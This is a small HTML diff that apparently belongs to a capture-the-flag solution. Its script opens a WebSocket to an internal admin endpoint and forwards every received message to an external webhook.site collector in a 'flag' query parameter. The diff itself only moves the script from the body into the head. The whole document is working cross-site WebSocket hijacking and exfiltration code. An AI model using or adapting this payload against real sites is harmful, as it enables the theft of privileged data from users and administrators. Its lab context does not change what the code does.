@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <html>
 <head>
-</head>
-<body>
     <script>
         const socket = new WebSocket('ws://web:8080/admin/ws');
         socket.onopen = () => { 
@@ -12,5 +10,5 @@
             fetch(`https://webhook.site/3d6fec3f-a86f-4ada-911f-5db410f9159d?flag=${message.data}`);
         };
     </script>
-</body>
+</head>
 </html>
